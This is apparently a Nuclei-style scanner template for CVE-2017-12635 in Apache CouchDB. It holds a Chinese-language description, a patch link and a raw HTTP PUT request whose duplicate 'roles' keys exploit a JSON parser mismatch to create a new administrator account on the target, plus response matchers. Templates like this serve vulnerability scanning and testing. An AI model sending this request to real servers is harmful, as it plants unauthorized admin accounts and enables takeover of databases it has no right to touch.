id: CVE-2017-12635
info:
  name: Apache CouchDB 1.7.0 / 2.x < 2.1.1 - Remote Privilege Escalation
  author:
  - l0ne1y
  description: |-
    Apache CouchDB 越权创建管理员漏洞
    Apache CouchDB是美国阿帕奇（Apache）软件基金会的一个免费、开源、面向文档的数据库，是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。

    Apache CouchDB 1.7.0之前的版本和2.1.1之前的2.x版本中存在权限提升漏洞，该漏洞源于基于rlang的JSON解析器和基于JavaScript的JSON解析器之间存在差异。攻击者可利用该漏洞访问任意的shell命令或获取管理员权限。
  severity: critical
  remediation: |-
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://lists.apache.org/thread.html/6c405bf3f8358e6314076be9f48c89a2e0ddf00539906291ebdf0c67@%3Cdev.couchdb.apache.org%3E
requests:
- matchers:
  - type: word
    part: header
    words:
    - application/json
    - 'Location:'
  - type: word
    part: body
    words:
    - org.couchdb.user:{{verify}}
    - conflict
    - Document update conflict
  - type: status
    status:
    - 201
    - 409
  matchers-condition: and
  raw:
  - |
    PUT /_users/org.couchdb.user:{{verify}} HTTP/1.1
    Host:  {{Hostname}}
    Accept: application/json

    {
      "type": "user",
      "name": "{{verify}}",
      "roles": ["_admin"],
      "roles": [],
      "password": "123456"
    }
variables:
  verify: '{{rand_int(200000000, 210000000)}}'
